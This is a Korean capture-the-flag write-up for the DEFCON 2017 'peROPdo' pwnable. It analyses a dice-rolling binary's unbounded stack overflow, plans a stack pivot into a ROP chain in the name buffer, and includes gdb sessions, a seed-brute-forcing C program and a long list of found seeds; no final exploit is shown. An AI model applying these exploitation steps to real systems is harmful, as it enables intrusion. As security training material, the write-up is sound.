---
title: "Potent Pwnables) peROPdo"
sidebar_position: 1
---
## **Information**

### **Description**
```
Shall we play a game?

peropdo\_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me 80

Files <https://2017.notmalware.ru/546864f14defe52b0f2de70bf45603668278a151/peropdo>
```
### **File**

* [peropdo](/attachments/1147550/1147549.bin)

### **Source Code**

* <https://github.com/legitbs/quals-2017/tree/master/peropdo>

## **Writeup**

### File information

```bash title="File information"
lazenca0x0@ubuntu:~/CTF/DEFCON2017/peROPdo$ file peropdo 
peropdo: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=ff28acf005e647b8d705997bebcf600a073a32b0, stripped
lazenca0x0@ubuntu:~/CTF/DEFCON2017/peROPdo$ checksec.sh --file peropdo 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   peropdo
lazenca0x0@ubuntu:~/CTF/DEFCON2017/peROPdo$
```

### **Binary analysis**

#### **Main**

* 해당 함수는 다음과 같은 기능을 합니다.
  + scanf()함수를 이용해 사용자로 부터 입력받은 값을 전역변수인 &gName에 저장합니다.
  + 해당 값은 srandom()의 인자로도 사용됩니다.
  + gameplay()함수를 실행합니다.

```c title="main"
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _IO_puts("What is your name?");
  _IO_fflush(off_80EB560);
  scanf("%s", &gName);
  __srandom(gName);
  return gameplay((int)&gName);
}
```

#### **gameplay**

* 해당 함수는 다음과 같은 기능을 합니다.
  + 사용자로 부터 "주사위 굴리기 횟수"를 입력받습니다.
  + 입력받은 횟수만큼 random()함수를 호출해 return 받은 값을 numList[]에 저장합니다.
  + numList[]에 저장된 값은 1~6 범위 안의 값이 출력되도록 연산한 후에 출력합니다.
* 취약성은 여기서 발생합니다.
  + "주사위 굴리기 횟수"로 입력받은 값에 대한 제한이 없습니다.
  + 이로 인해 '23' 이상의 값을 입력하면 Return addresss 영역을 Overwrite 할 수 있습니다.

```c title="gameplay"
int __cdecl gameplay(int name)
{
  int diceCount; // ebx@2 MAPDST
  int diceNumber; // ecx@5
  int result; // eax@6
  int v5; // [esp+0h] [ebp-1Ch]@2
  int v6; // [esp+4h] [ebp-18h]@2
  int v7; // [esp+8h] [ebp-14h]@1
  char answer; // [esp+1Bh] [ebp-1h]@6
  int rollCount; // [esp+1Ch] [ebp+0h]@2
  int numList[16]; // [esp+20h] [ebp+4h]@3

  dprintf((const char *)1, "Welcome to peROPdo, %s\n", name);
  do
  {
    diceCount = 0;
    _IO_puts("How many dice would you like to roll?");
    _IO_fflush(off_80EB560);
    scanf("%d", (int)&rollCount);
    if ( rollCount > 0 )
    {
      do
        numList[diceCount++] = j____random(v5, v6, v7);
      while ( rollCount > diceCount );
    }
    diceCount = 0;
    dprintf((const char *)1, "You rolled: ");
    if ( rollCount > 0 )
    {
      do
      {
        diceNumber = numList[diceCount++];
        v7 = diceNumber % 6 + 1;
        dprintf((const char *)1, "%d ");
      }
      while ( rollCount > diceCount );
    }
    dprintf((const char *)1, "\nWould you like to play again? ");
    _IO_fflush(off_80EB560);
    result = scanf("%1s", (int)&answer);
  }
  while ( answer == 'y' );
  return result;
}
```

### Structure of Exploit code
:::note
* name에 seed + ROP 를 입력
* seed 에 의해 leave 영역에 0x80ecff4 주소를 Overwrite
* ROP에 의해 flag 내용 출력
:::

* The following information is required for an attack:

:::note
* leave영역(numList[22])에 0x80ecff4 를 저장하는 seed 값
* flag 내용을 출력하는 rop
* Stack Overwrite
:::

### **Information for attack**

#### **Stack Overwrite**

* 다음과 같이 Stack Overflow를 확인 할 수 있습니다.
  + 우선 다음과 같이 Break point를 설정합니다.

```bash title="Break point"
gdb-peda$ b *0x08048F1D
Breakpoint 1 at 0x8048f1d
gdb-peda$ b *0x08048FD0
Breakpoint 2 at 0x8048fd0
gdb-peda$ b *0x08048B50
Breakpoint 3 at 0x8048b50
```

* "주사위 굴리기 횟수"로 '24'를 입력합니다.
  + numList[]의 영역은 0xbffff370 입니다.
  + 해당 영역으로 부터 0x5c(4 \* 23)떨어진 곳에 Return addresss가 저장되어 있습니다.
    - 0xbffff3cc : 0x08048b4f

```bash title="Return Address Area check"
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/DEFCON/peROPdo/peropdo 
What is your name?
AAAA
Welcome to peROPdo, AAAA
How many dice would you like to roll?
24
Breakpoint 1, 0x08048f1d in ?? ()
gdb-peda$ i r esi
esi            0xbffff370	0xbffff370
gdb-peda$ i r ebx
ebx            0x0	0x0
gdb-peda$ x/24wx 0xbffff370
0xbffff370:	0xffffffff	0x080eb080	0xbffff398	0x0000001f
0xbffff380:	0x0804ef57	0x080eb080	0xbffff398	0x080eb2a0
0xbffff390:	0x080eb2a0	0x00000012	0x62f9e2bc	0x080481a8
0xbffff3a0:	0x00000000	0x080eb00c	0xbffff3e8	0x0804eb26
0xbffff3b0:	0x41414141	0x080eb080	0xbffff3d4	0x080481a8
0xbffff3c0:	0x00000000	0x080eb00c	0xbffff3e8	0x08048b4f
gdb-peda$ x/wx 0xbffff370 + 4 * 23
0xbffff3cc:	0x08048b4f
gdb-peda$ x/2i 0x08048b4f
   0x8048b4f:	leave  
   0x8048b50:	ret    
gdb-peda$
```

* "주사위 굴리기 횟수"만큼 numList[] 영역에 값을 입력하면 다음과 같이 Return addresss 영역이 Overwrite 됩니다.

```bash title="Overwrite for Return Address"
gdb-peda$ c
Continuing.

Breakpoint 1, 0x08048f1d in ?? ()
gdb-peda$ i r esi
esi            0xbffff370	0xbffff370
gdb-peda$ i r ebx
ebx            0x1	0x1
gdb-peda$ d 1
gdb-peda$ c
Continuing.
You rolled: 3 3 2 1 5 3 4 6 3 4 2 2 3 2 1 1 4 5 4 6 3 6 4 3 
Would you like to play again? n

Breakpoint 2, 0x08048fd0 in ?? ()
gdb-peda$ x/24wx 0xbffff370
0xbffff370:	0x79ef55a0	0x3b9717ae	0x41c57137	0x1b4bc588
0xbffff380:	0x56156104	0x1b60129e	0x5c0023e9	0x5c318861
0xbffff390:	0x0a9d1c92	0x4fb8a5a3	0x535b44cb	0x25b9057d
0xbffff3a0:	0x12e0f7ce	0x25613deb	0x16640610	0x44a6562e
0xbffff3b0:	0x07e1f761	0x46438e1c	0x6a5d34fd	0x0226d11d
0xbffff3c0:	0x6bc639ea	0x6db6e063	0x1d8457d3	0x06ac4f00
gdb-peda$ c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
```

* 하지만 해당 문제에서 gameplay() 함수의 Return addresss 영역을 Overwrite 하지 않습니다.
  + Return addresss 영역을 'name' 영역의 주소로 변경해도 해당 영역에 실행권한이 없기 때문에 Shellcode가 동작하지 않습니다.
  + ROP를 구현하려고 해도 ESP 레지스터가 변경되지 않았기 때문에 공격에 실패합니다.
* 해당 문제를 공격하기 위해서는 'pop ebp'가 호출될 때 사용되는 Stack 영역을 Overwrite해야 합니다.
  + 해당 영역을 Overwrite하면 'pop ebp' 명령어에 의해 Stack 영역에 저장된 값이 'ebp' 레지스터에 저장됩니다.

```bash title="gameplay()"
gdb-peda$ x/5i 0x08048FCC
   0x8048fcc:	pop    ebx
   0x8048fcd:	pop    esi
   0x8048fce:	pop    edi
   0x8048fcf:	pop    ebp
   0x8048fd0:	ret    
gdb-peda$
```

* 그리고 'ret' 명령에 의해 다음과 같이 main() 함수 영역으로 이동합니다.
  + 여기서 'leave' 명령어에 의해 'ebp' 레지스터에 저장된 값이 'esp'레지스터에 저장됩니다.
  + 이로 인해 'name' 에 저장한 ROP 코드를 실행 할 수 있습니다.

```bash title="main()"
gdb-peda$ x/3i 0x08048B4A
   0x8048b4a:	call   0x8048eb0
   0x8048b4f:	leave  
   0x8048b50:	ret    
gdb-peda$
```

```asm title="leave and ret"
mov esp, ebp
pop ebp
```

#### **Find seed**

* 다음과 같은 Code를 이용해 seed를 찾습니다.

  + name 변수의 영역은 0x080ECFC0 ~ 0x080ED040

```c title="Find seed code"
#include <stdio.h>
#include <stdlib.h>

unsigned int numbers[];

void main(){
	unsigned int i;
	unsigned int j;

	for(j = 0; j< 0xffffffff;j++){
		srand(j);

		for(i = 0;i<24;i++){
			numbers[i] = rand();
		}

		if(numbers[22] < 0x80ED040 && 0x80ECFC0 < numbers[22]){
			printf("Find! Seed : %u, Area numbers[22] 0x%x\n",j,numbers[22]);
		}else if(numbers[23] < 0x80ED040 && 0x80ECFC0 < numbers[23]){
			printf("Find! Seed : %u, Area numbers[23] 0x%x\n",j,numbers[23]); 
		}
	}
}
```

* 여기 Exploit code에서는 다음과 같은 Seed 값을 사용합니다.
  + Find! Seed : 243015623, Area numbers[22] 0x80ecfff

```bash title="Find Seed"
lazenca0x0@ubuntu:~/CTF/DEFCON/peROPdo$ ./Find 
Find! Seed : 18974957, Area numbers[23] 0x80ed002
Find! Seed : 23139105, Area numbers[23] 0x80ed035
Find! Seed : 25868882, Area numbers[23] 0x80ed028
Find! Seed : 27739342, Area numbers[23] 0x80ed024
Find! Seed : 28983869, Area numbers[22] 0x80ed03c
Find! Seed : 31170207, Area numbers[23] 0x80ecfd9
Find! Seed : 32253805, Area numbers[23] 0x80ed027
Find! Seed : 34711842, Area numbers[22] 0x80ed035
Find! Seed : 35883150, Area numbers[22] 0x80ed01b
Find! Seed : 43569375, Area numbers[23] 0x80ecfe4
Find! Seed : 76200282, Area numbers[22] 0x80ecfed
Find! Seed : 80328233, Area numbers[23] 0x80ecfc3
Find! Seed : 85473397, Area numbers[23] 0x80ecfc7
Find! Seed : 108737191, Area numbers[22] 0x80ed024
Find! Seed : 121057826, Area numbers[23] 0x80ecfd7
Find! Seed : 163764054, Area numbers[22] 0x80ecfd6
Find! Seed : 166032356, Area numbers[22] 0x80ed014
Find! Seed : 168073183, Area numbers[22] 0x80ecfe1
Find! Seed : 172984880, Area numbers[23] 0x80ecfde
Find! Seed : 176671284, Area numbers[22] 0x80ecfd7
Find! Seed : 180764733, Area numbers[23] 0x80ecfc6
Find! Seed : 200940553, Area numbers[22] 0x80ecfcc
Find! Seed : 209424203, Area numbers[22] 0x80ed02d
Find! Seed : 211004597, Area numbers[23] 0x80ecfdb
Find! Seed : 214257056, Area numbers[23] 0x80ed00c
Find! Seed : 231561161, Area numbers[23] 0x80ed016
Find! Seed : 243015623, Area numbers[22] 0x80ecfff
Find! Seed : 246451885, Area numbers[23] 0x80ed001
Find! Seed : 258553509, Area numbers[22] 0x80ed034
Find! Seed : 261454618, Area numbers[22] 0x80ecfdb
Find! Seed : 272295760, Area numbers[22] 0x80ed014
Find! Seed : 274442419, Area numbers[23] 0x80ecfe6
Find! Seed : 325831281, Area numbers[22] 0x80ed020
Find! Seed : 328947300, Area numbers[23] 0x80ed01a
Find! Seed : 329070757, Area numbers[23] 0x80ed029
Find! Seed : 340067350, Area numbers[23] 0x80ecfe2
Find! Seed : 340550074, Area numbers[22] 0x80ed027
Find! Seed : 352694744, Area numbers[22] 0x80ecfc4
Find! Seed : 355101984, Area numbers[22] 0x80ecfc1
Find! Seed : 356897651, Area numbers[22] 0x80ecfe4
Find! Seed : 357098268, Area numbers[22] 0x80ed03f
Find! Seed : 359885869, Area numbers[23] 0x80ecfc2
Find! Seed : 366701048, Area numbers[23] 0x80ed02e
Find! Seed : 381937112, Area numbers[23] 0x80ed026
Find! Seed : 387007365, Area numbers[22] 0x80ecfef
Find! Seed : 404137992, Area numbers[23] 0x80ed000
Find! Seed : 404403895, Area numbers[23] 0x80ecfd0
Find! Seed : 437660644, Area numbers[23] 0x80ed027
Find! Seed : 451231338, Area numbers[22] 0x80ecfce
Find! Seed : 459774503, Area numbers[22] 0x80ecfe6
Find! Seed : 472153197, Area numbers[23] 0x80ecff9
Find! Seed : 475955931, Area numbers[23] 0x80ed006
Find! Seed : 484228141, Area numbers[23] 0x80ed011
Find! Seed : 489413492, Area numbers[22] 0x80ed03d
Find! Seed : 490256920, Area numbers[23] 0x80ecfdd
Find! Seed : 508491973, Area numbers[22] 0x80ecfdb
Find! Seed : 509898216, Area numbers[22] 0x80ecfea
Find! Seed : 514969754, Area numbers[23] 0x80ecfd7
Find! Seed : 524633999, Area numbers[23] 0x80ecfeb
Find! Seed : 544551095, Area numbers[23] 0x80ecfd3
Find! Seed : 552502518, Area numbers[22] 0x80ed009
Find! Seed : 571647666, Area numbers[22] 0x80ecfcf
Find! Seed : 574140291, Area numbers[23] 0x80ed030
Find! Seed : 574472599, Area numbers[23] 0x80ed01b
Find! Seed : 594035102, Area numbers[22] 0x80ecfc8
Find! Seed : 598586870, Area numbers[22] 0x80ecfd8
Find! Seed : 616984851, Area numbers[22] 0x80ed01a
Find! Seed : 622892289, Area numbers[23] 0x80ecff6
Find! Seed : 641719019, Area numbers[22] 0x80ed02b
Find! Seed : 643142134, Area numbers[22] 0x80ed017
Find! Seed : 649489290, Area numbers[23] 0x80ecff1
Find! Seed : 655509931, Area numbers[23] 0x80ecfce
Find! Seed : 660155732, Area numbers[22] 0x80ecffc
Find! Seed : 662726868, Area numbers[22] 0x80ed02b
Find! Seed : 669627300, Area numbers[22] 0x80ed027
Find! Seed : 698617125, Area numbers[22] 0x80ed012
Find! Seed : 702178163, Area numbers[23] 0x80ecffd
Find! Seed : 704274460, Area numbers[23] 0x80ecfe7
Find! Seed : 705266630, Area numbers[22] 0x80ecffd
Find! Seed : 735314749, Area numbers[22] 0x80ecffd
Find! Seed : 739242158, Area numbers[22] 0x80ecffb
Find! Seed : 748049012, Area numbers[23] 0x80ed026
Find! Seed : 769182904, Area numbers[23] 0x80ecff3
Find! Seed : 788882890, Area numbers[22] 0x80ed013
Find! Seed : 797819326, Area numbers[22] 0x80ed014
Find! Seed : 806731911, Area numbers[23] 0x80ed037
Find! Seed : 810857041, Area numbers[22] 0x80ecfe4
Find! Seed : 824761172, Area numbers[22] 0x80ed039
Find! Seed : 848419790, Area numbers[23] 0x80ecfca
Find! Seed : 849937440, Area numbers[22] 0x80ecfdf
Find! Seed : 851721652, Area numbers[22] 0x80ed012
Find! Seed : 875966976, Area numbers[22] 0x80ecfec
Find! Seed : 896765236, Area numbers[23] 0x80ecfd5
Find! Seed : 910507300, Area numbers[23] 0x80ed014
Find! Seed : 911301586, Area numbers[23] 0x80ed029
Find! Seed : 915025865, Area numbers[23] 0x80ecfcf
Find! Seed : 952512148, Area numbers[22] 0x80ed02c
Find! Seed : 982509703, Area numbers[22] 0x80ecfd0
Find! Seed : 992651467, Area numbers[22] 0x80ecfe5
Find! Seed : 994644271, Area numbers[22] 0x80ecfd6
Find! Seed : 995309326, Area numbers[22] 0x80ed017
Find! Seed : 999025166, Area numbers[22] 0x80ed02b
Find! Seed : 1008275115, Area numbers[23] 0x80ed00f
Find! Seed : 1012394742, Area numbers[23] 0x80ecff3
Find! Seed : 1012549073, Area numbers[22] 0x80ed021
Find! Seed : 1014091306, Area numbers[23] 0x80ecfd0
Find! Seed : 1019053772, Area numbers[23] 0x80ecfce
Find! Seed : 1045695880, Area numbers[23] 0x80ed001
Find! Seed : 1055888900, Area numbers[23] 0x80ecfd7
Find! Seed : 1059277167, Area numbers[22] 0x80ed02b
Find! Seed : 1067236620, Area numbers[22] 0x80ed033
Find! Seed : 1067731502, Area numbers[22] 0x80ed00e
Find! Seed : 1072540055, Area numbers[23] 0x80ed00a
Find! Seed : 1072689657, Area numbers[22] 0x80ed021
Find! Seed : 1077822771, Area numbers[22] 0x80ed01c
Find! Seed : 1107690118, Area numbers[23] 0x80ed01d
Find! Seed : 1121871954, Area numbers[23] 0x80ed018
Find! Seed : 1127619207, Area numbers[22] 0x80ed021
Find! Seed : 1157693331, Area numbers[23] 0x80ed005
Find! Seed : 1168494916, Area numbers[23] 0x80ecfe9
Find! Seed : 1168863113, Area numbers[22] 0x80ed03c
Find! Seed : 1187823434, Area numbers[22] 0x80ecfe0
Find! Seed : 1189000676, Area numbers[23] 0x80ed017
Find! Seed : 1190322887, Area numbers[23] 0x80ecfec
Find! Seed : 1202823238, Area numbers[22] 0x80ed01b
Find! Seed : 1214580564, Area numbers[22] 0x80ed03f
Find! Seed : 1216544494, Area numbers[22] 0x80ed016
Find! Seed : 1226149449, Area numbers[23] 0x80ed015
Find! Seed : 1248483950, Area numbers[23] 0x80ed00d
Find! Seed : 1271439837, Area numbers[22] 0x80ecfd0
Find! Seed : 1276598143, Area numbers[22] 0x80ecfc5
Find! Seed : 1284020637, Area numbers[23] 0x80ed00d
Find! Seed : 1293573180, Area numbers[23] 0x80ecff7
Find! Seed : 1298764815, Area numbers[22] 0x80ecfd1
Find! Seed : 1303540759, Area numbers[23] 0x80ed03b
Find! Seed : 1323473170, Area numbers[22] 0x80ed028
Find! Seed : 1351129233, Area numbers[23] 0x80ed000
Find! Seed : 1351436451, Area numbers[22] 0x80ed011
Find! Seed : 1354073596, Area numbers[22] 0x80ecfce
Find! Seed : 1355865539, Area numbers[22] 0x80ecfe1
Find! Seed : 1357095849, Area numbers[23] 0x80ecfd3
Find! Seed : 1359607621, Area numbers[22] 0x80ecfd0
Find! Seed : 1372629984, Area numbers[23] 0x80ed00b
Find! Seed : 1376717652, Area numbers[22] 0x80ed031
Find! Seed : 1385876326, Area numbers[23] 0x80ecff7
Find! Seed : 1423325474, Area numbers[22] 0x80ecff6
Find! Seed : 1428512824, Area numbers[22] 0x80ecfe4
Find! Seed : 1440857448, Area numbers[22] 0x80ecfed
Find! Seed : 1445281432, Area numbers[22] 0x80ed006
Find! Seed : 1453431119, Area numbers[22] 0x80ecff1
Find! Seed : 1453432159, Area numbers[22] 0x80ed013
Find! Seed : 1457561653, Area numbers[23] 0x80ed00c
Find! Seed : 1474059550, Area numbers[23] 0x80ecffd
Find! Seed : 1509582464, Area numbers[23] 0x80ecff1
Find! Seed : 1510454642, Area numbers[23] 0x80ed012
Find! Seed : 1517665375, Area numbers[23] 0x80ecfd8
Find! Seed : 1523945378, Area numbers[22] 0x80ed01a
Find! Seed : 1535928747, Area numbers[22] 0x80ecfe4
Find! Seed : 1540441295, Area numbers[22] 0x80ecfe7
Find! Seed : 1540562391, Area numbers[23] 0x80ed034
Find! Seed : 1544223378, Area numbers[22] 0x80ecfe8
Find! Seed : 1549162623, Area numbers[22] 0x80ecfc8
Find! Seed : 1558365601, Area numbers[22] 0x80ecfee
Find! Seed : 1559684681, Area numbers[23] 0x80ed013
Find! Seed : 1567165736, Area numbers[22] 0x80ecfd2
Find! Seed : 1571824936, Area numbers[22] 0x80ecfea
Find! Seed : 1572731521, Area numbers[22] 0x80ed00b
Find! Seed : 1574963723, Area numbers[22] 0x80ed033
Find! Seed : 1582010802, Area numbers[22] 0x80ecfd1
Find! Seed : 1582973390, Area numbers[22] 0x80ecfd9
Find! Seed : 1593331760, Area numbers[23] 0x80ecffc
Find! Seed : 1608904758, Area numbers[22] 0x80ed000
Find! Seed : 1610185176, Area numbers[23] 0x80ed032
Find! Seed : 1614698979, Area numbers[22] 0x80ed031
Find! Seed : 1621835726, Area numbers[22] 0x80ed001
Find! Seed : 1621924145, Area numbers[23] 0x80ed036
Find! Seed : 1660823561, Area numbers[23] 0x80ed014
Find! Seed : 1664381977, Area numbers[22] 0x80ecfc5
Find! Seed : 1679747743, Area numbers[22] 0x80ecfd8
Find! Seed : 1688343515, Area numbers[22] 0x80ecff0
Find! Seed : 1706243768, Area numbers[23] 0x80ed015
Find! Seed : 1709030798, Area numbers[22] 0x80ed032
Find! Seed : 1711255540, Area numbers[23] 0x80ecff0
Find! Seed : 1716186625, Area numbers[22] 0x80ecff0
Find! Seed : 1716832171, Area numbers[23] 0x80ecfe3
Find! Seed : 1717050143, Area numbers[22] 0x80ed026
Find! Seed : 1733699139, Area numbers[23] 0x80ecffc
Find! Seed : 1745458432, Area numbers[22] 0x80ed01f
Find! Seed : 1753099224, Area numbers[22] 0x80ecff3
Find! Seed : 1757022749, Area numbers[22] 0x80ecff7
Find! Seed : 1757974704, Area numbers[23] 0x80ecfe8
Find! Seed : 1776501294, Area numbers[23] 0x80ecff6
Find! Seed : 1778460598, Area numbers[23] 0x80ecffb
Find! Seed : 1813947983, Area numbers[23] 0x80ecfe7
Find! Seed : 1818225087, Area numbers[22] 0x80ed017
Find! Seed : 1825012362, Area numbers[22] 0x80ed002
Find! Seed : 1832600867, Area numbers[23] 0x80ed02b
Find! Seed : 1842475527, Area numbers[23] 0x80ed02b
Find! Seed : 1854349515, Area numbers[22] 0x80ecfd8
Find! Seed : 1857214926, Area numbers[23] 0x80ed015
Find! Seed : 1866292075, Area numbers[23] 0x80ed00c
Find! Seed : 1876014494, Area numbers[23] 0x80ed032
Find! Seed : 1876587320, Area numbers[23] 0x80ed00a
Find! Seed : 1896930217, Area numbers[22] 0x80ecfcf
Find! Seed : 1898967060, Area numbers[23] 0x80ed01d
Find! Seed : 1900298162, Area numbers[23] 0x80ed032
Find! Seed : 1900476653, Area numbers[23] 0x80ed03e
Find! Seed : 1901215121, Area numbers[23] 0x80ecffe
Find! Seed : 1906357553, Area numbers[23] 0x80ed01d
Find! Seed : 1910921155, Area numbers[23] 0x80ed008
Find! Seed : 1914259330, Area numbers[23] 0x80ed02d
Find! Seed : 1915601147, Area numbers[23] 0x80ecfc7
Find! Seed : 1917710574, Area numbers[22] 0x80ed00a
Find! Seed : 1935515181, Area numbers[23] 0x80ecfe8
Find! Seed : 1944153580, Area numbers[22] 0x80ecfd4
Find! Seed : 1953504637, Area numbers[22] 0x80ed007
Find! Seed : 1967129349, Area numbers[22] 0x80ecfe0
Find! Seed : 1974705287, Area numbers[23] 0x80ed038
Find! Seed : 1995662089, Area numbers[23] 0x80ed03f
Find! Seed : 1995873862, Area numbers[23] 0x80ecfed
Find! Seed : 2001575087, Area numbers[22] 0x80ecfce
Find! Seed : 2007937571, Area numbers[23] 0x80ecffe
Find! Seed : 2015563060, Area numbers[22] 0x80ed019
Find! Seed : 2030740698, Area numbers[23] 0x80ed013
Find! Seed : 2032355842, Area numbers[23] 0x80ed029
Find! Seed : 2052326866, Area numbers[23] 0x80ed030
Find! Seed : 2065505053, Area numbers[23] 0x80ecfd1
Find! Seed : 2068415122, Area numbers[23] 0x80ecfff
Find! Seed : 2071884213, Area numbers[23] 0x80ed032
Find! Seed : 2074259701, Area numbers[23] 0x80ed022
Find! Seed : 2075605779, Area numbers[22] 0x80ecff4
Find! Seed : 2080842271, Area numbers[22] 0x80ecff8
Find! Seed : 2081319692, Area numbers[22] 0x80ed000
Find! Seed : 2085799040, Area numbers[23] 0x80ecfdc
Find! Seed : 2101828053, Area numbers[22] 0x80ecfdd
Find! Seed : 2106504322, Area numbers[22] 0x80ed023
Find! Seed : 2111411924, Area numbers[23] 0x80ecfc3
Find! Seed : 2115086443, Area numbers[23] 0x80ecff9
Find! Seed : 2123587630, Area numbers[23] 0x80ed01d
Find! Seed : 2127007190, Area numbers[23] 0x80ed016
Find! Seed : 2146106521, Area numbers[23] 0x80ecfde
Find! Seed : 2150900437, Area numbers[23] 0x80ed009
Find! Seed : 2154670638, Area numbers[23] 0x80ed029
Find! Seed : 2176141212, Area numbers[22] 0x80ecfd9
Find! Seed : 2182678884, Area numbers[23] 0x80ed03a
Find! Seed : 2184803065, Area numbers[23] 0x80ed011
Find! Seed : 2189565948, Area numbers[22] 0x80ecfd3
Find! Seed : 2198075556, Area numbers[23] 0x80ed009
Find! Seed : 2205608675, Area numbers[22] 0x80ecfc3
Find! Seed : 2206393273, Area numbers[23] 0x80ed017
Find! Seed : 2209721711, Area numbers[23] 0x80ed031
Find! Seed : 2212872013, Area numbers[22] 0x80ed03f
Find! Seed : 2227443075, Area numbers[23] 0x80ed038
Find! Seed : 2230134653, Area numbers[23] 0x80ecffa
Find! Seed : 2233338793, Area numbers[22] 0x80ecfc2
Find! Seed : 2234908693, Area numbers[22] 0x80ed024
Find! Seed : 2246690262, Area numbers[23] 0x80ed00b
Find! Seed : 2270229175, Area numbers[23] 0x80ecffe
Find! Seed : 2270332417, Area numbers[23] 0x80ecfce
Find! Seed : 2271695672, Area numbers[22] 0x80ecfd8
Find! Seed : 2274962918, Area numbers[22] 0x80ecfcf
Find! Seed : 2302533630, Area numbers[23] 0x80ecfce
Find! Seed : 2310351188, Area numbers[22] 0x80ecfcb
Find! Seed : 2316948999, Area numbers[23] 0x80ecfdb
Find! Seed : 2326059267, Area numbers[23] 0x80ed023
Find! Seed : 2348506029, Area numbers[23] 0x80ed038
Find! Seed : 2371379562, Area numbers[23] 0x80ecfc4
Find! Seed : 2375516284, Area numbers[23] 0x80ecfc6
Find! Seed : 2376245691, Area numbers[22] 0x80ecfd0
Find! Seed : 2389549179, Area numbers[22] 0x80ed01d
Find! Seed : 2390097597, Area numbers[22] 0x80ecfe9
Find! Seed : 2390414052, Area numbers[23] 0x80ed006
Find! Seed : 2398194464, Area numbers[23] 0x80ecfcd
Find! Seed : 2399140145, Area numbers[23] 0x80ed032
Find! Seed : 2402250698, Area numbers[22] 0x80ed00e
Find! Seed : 2412637441, Area numbers[23] 0x80ed02d
Find! Seed : 2427322787, Area numbers[22] 0x80ecfc4
Find! Seed : 2430356259, Area numbers[22] 0x80ecff2
Find! Seed : 2430462237, Area numbers[23] 0x80ed008
Find! Seed : 2439598760, Area numbers[22] 0x80ed008
Find! Seed : 2447752188, Area numbers[22] 0x80ed006
Find! Seed : 2454877707, Area numbers[22] 0x80ed020
Find! Seed : 2460231213, Area numbers[22] 0x80ed036
Find! Seed : 2460343855, Area numbers[22] 0x80ed006
Find! Seed : 2461448513, Area numbers[23] 0x80ed00a
Find! Seed : 2466111563, Area numbers[22] 0x80ed022
Find! Seed : 2468388065, Area numbers[23] 0x80ecfe7
Find! Seed : 2471920658, Area numbers[23] 0x80ecfe7
Find! Seed : 2473633182, Area numbers[22] 0x80ed022
Find! Seed : 2503058597, Area numbers[23] 0x80ecff6
Find! Seed : 2507350661, Area numbers[23] 0x80ed015
Find! Seed : 2516688402, Area numbers[22] 0x80ed00a
Find! Seed : 2533143162, Area numbers[22] 0x80ed01c
Find! Seed : 2538115271, Area numbers[22] 0x80ecfc2
Find! Seed : 2544055922, Area numbers[22] 0x80ed033
Find! Seed : 2545940476, Area numbers[23] 0x80ed01e
Find! Seed : 2554893212, Area numbers[22] 0x80ed00b
Find! Seed : 2556494076, Area numbers[23] 0x80ed037
Find! Seed : 2577041844, Area numbers[22] 0x80ecfef
Find! Seed : 2580536628, Area numbers[23] 0x80ecfc3
Find! Seed : 2585171226, Area numbers[22] 0x80ed030
Find! Seed : 2589405093, Area numbers[23] 0x80ed01a
Find! Seed : 2598751502, Area numbers[23] 0x80ecfe6
Find! Seed : 2614325726, Area numbers[23] 0x80ed039
Find! Seed : 2614904525, Area numbers[23] 0x80ed03b
Find! Seed : 2624109493, Area numbers[23] 0x80ed012
Find! Seed : 2630354267, Area numbers[22] 0x80ed032
Find! Seed : 2651346575, Area numbers[23] 0x80ecfca
Find! Seed : 2659943222, Area numbers[22] 0x80ed039
Find! Seed : 2677666605, Area numbers[23] 0x80ed034
Find! Seed : 2681337732, Area numbers[23] 0x80ecfcc
Find! Seed : 2683786043, Area numbers[22] 0x80ecfdf
Find! Seed : 2697693644, Area numbers[22] 0x80ed01a
Find! Seed : 2701064221, Area numbers[23] 0x80ecfcd
Find! Seed : 2724624801, Area numbers[23] 0x80ed01e
Find! Seed : 2732999070, Area numbers[22] 0x80ed01c
Find! Seed : 2736676111, Area numbers[23] 0x80ecfeb
Find! Seed : 2759547323, Area numbers[23] 0x80ecfcb
Find! Seed : 2760967083, Area numbers[22] 0x80ecfc3
Find! Seed : 2763062464, Area numbers[22] 0x80ed03f
Find! Seed : 2767430408, Area numbers[22] 0x80ecfd5
Find! Seed : 2775068508, Area numbers[23] 0x80ecffc
Find! Seed : 2778926916, Area numbers[23] 0x80ed015
Find! Seed : 2783608226, Area numbers[22] 0x80ecfc8
Find! Seed : 2785674627, Area numbers[23] 0x80ed006
Find! Seed : 2798607786, Area numbers[23] 0x80ed03e
Find! Seed : 2799832226, Area numbers[22] 0x80ecfe5
Find! Seed : 2804717589, Area numbers[23] 0x80ecff6
Find! Seed : 2807163653, Area numbers[22] 0x80ecfe0
Find! Seed : 2824753641, Area numbers[22] 0x80ed01c
Find! Seed : 2834497617, Area numbers[23] 0x80ecff4
Find! Seed : 2848458564, Area numbers[23] 0x80ed033
Find! Seed : 2851741150, Area numbers[23] 0x80ed01c
Find! Seed : 2855724878, Area numbers[23] 0x80ecff4
Find! Seed : 2862507962, Area numbers[22] 0x80ed008
Find! Seed : 2864691446, Area numbers[22] 0x80ecff8
Find! Seed : 2865089572, Area numbers[22] 0x80ed013
Find! Seed : 2872187289, Area numbers[22] 0x80ed004
Find! Seed : 2878393674, Area numbers[23] 0x80ecfcc
Find! Seed : 2879502852, Area numbers[22] 0x80ed010
Find! Seed : 2884863367, Area numbers[22] 0x80ed00c
Find! Seed : 2885041624, Area numbers[23] 0x80ed01d
Find! Seed : 2893962319, Area numbers[22] 0x80ed02e
Find! Seed : 2910865416, Area numbers[23] 0x80ed014
Find! Seed : 2943358448, Area numbers[23] 0x80ecff7
Find! Seed : 2946972709, Area numbers[22] 0x80ecfcf
Find! Seed : 2954083818, Area numbers[22] 0x80ecfef
Find! Seed : 2958593732, Area numbers[23] 0x80ecfd3
Find! Seed : 2970991364, Area numbers[22] 0x80ecfed
Find! Seed : 2990092596, Area numbers[23] 0x80ed013
Find! Seed : 2996163605, Area numbers[22] 0x80ed01f
Find! Seed : 2996447571, Area numbers[22] 0x80ed029
Find! Seed : 3011248504, Area numbers[23] 0x80ed03c
Find! Seed : 3011399810, Area numbers[23] 0x80ed01d
Find! Seed : 3019790209, Area numbers[22] 0x80ed019
